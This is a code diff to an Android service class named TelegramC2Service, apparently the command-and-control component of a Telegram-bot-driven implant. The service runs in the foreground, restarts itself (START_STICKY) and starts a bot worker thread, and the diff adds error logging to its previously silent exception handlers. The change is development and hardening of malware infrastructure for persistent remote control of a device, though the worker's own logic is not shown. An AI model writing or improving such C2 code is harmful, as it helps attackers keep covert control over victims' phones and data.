@@ -17,12 +17,16 @@ public class TelegramC2Service extends Service {
         super.onCreate();
         try {
             ConfigLoader.load(this);
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            ErrorLogger.logError(this, "TelegramC2Service_Config", e);
+        }
         createNotifChannel();
         startForeground(1, createNotification());
         try {
             startWorker();
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            ErrorLogger.logError(this, "TelegramC2Service_OnCreate", e);
+        }
     }
 
     private void createNotifChannel() {
@@ -32,7 +36,9 @@ public class TelegramC2Service extends Service {
                 NotificationManager nm = getSystemService(NotificationManager.class);
                 nm.createNotificationChannel(chan);
             }
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            ErrorLogger.logError(this, "TelegramC2Service_CreateChannel", e);
+        }
     }
 
     private Notification createNotification() {
@@ -53,14 +59,18 @@ public class TelegramC2Service extends Service {
                 workerThread = new Thread(new TelegramBotWorker(this));
                 workerThread.start();
             }
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            ErrorLogger.logError(this, "TelegramC2Service_StartWorker", e);
+        }
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         try {
             startWorker();
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            ErrorLogger.logError(this, "TelegramC2Service_OnStart", e);
+        }
         return START_STICKY;
     }
 
@@ -68,7 +78,9 @@ public class TelegramC2Service extends Service {
     public void onDestroy() {
         try {
             if (workerThread != null) workerThread.interrupt();
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            ErrorLogger.logError(this, "TelegramC2Service_OnDestroy", e);
+        }
         super.onDestroy();
     }
 
